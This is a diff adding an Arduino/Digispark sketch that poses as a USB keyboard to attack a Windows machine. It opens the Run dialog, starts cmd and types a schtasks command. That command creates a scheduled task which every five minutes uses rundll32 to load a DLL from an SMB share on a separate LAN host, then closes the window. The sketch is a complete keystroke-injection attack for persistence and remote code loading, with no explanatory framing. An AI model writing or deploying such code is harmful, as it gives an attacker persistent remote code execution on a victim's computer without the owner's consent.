@@ -1,0 +1,43 @@
+#include <DigiKeyboardFr.h>
+
+void setup() {
+  // Wait for a few seconds at startup
+  
+}
+void loop(){
+
+  delay(5000);
+  
+  // Press and hold the Windows key (GUI)
+  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+
+  // Wait a bit
+  delay(500);
+
+  // Release the Windows key (GUI)
+  DigiKeyboardFr.sendKeyPress(0);
+
+  // Wait a bit
+  delay(500);
+
+  // Send "cmd" (Command Prompt) followed by the Enter key
+  DigiKeyboardFr.print("cmd");
+  DigiKeyboardFr.sendKeyPress(KEY_ENTER);
+
+  // Wait a bit
+  delay(500); // Wait long enough for the cmd window to open
+
+  // Send the schtasks command to create the scheduled task
+  DigiKeyboardFr.print("schtasks /create /tn \"MyCustomTask\" /tr \"cmd /c rundll32.exe \\192.168.88.128\LnYVN\test.dll,0\" /sc minute /mo 5");
+  DigiKeyboardFr.sendKeyPress(KEY_ENTER);
+
+  // Wait a bit
+  delay(100);
+  DigiKeyboardFr.print("exit");
+  DigiKeyboardFr.sendKeyPress(KEY_ENTER);
+
+  // Send Alt + F4 multiple times
+
+  // End the program
+  DigiKeyboardFr.sendKeyPress(0);
+} 
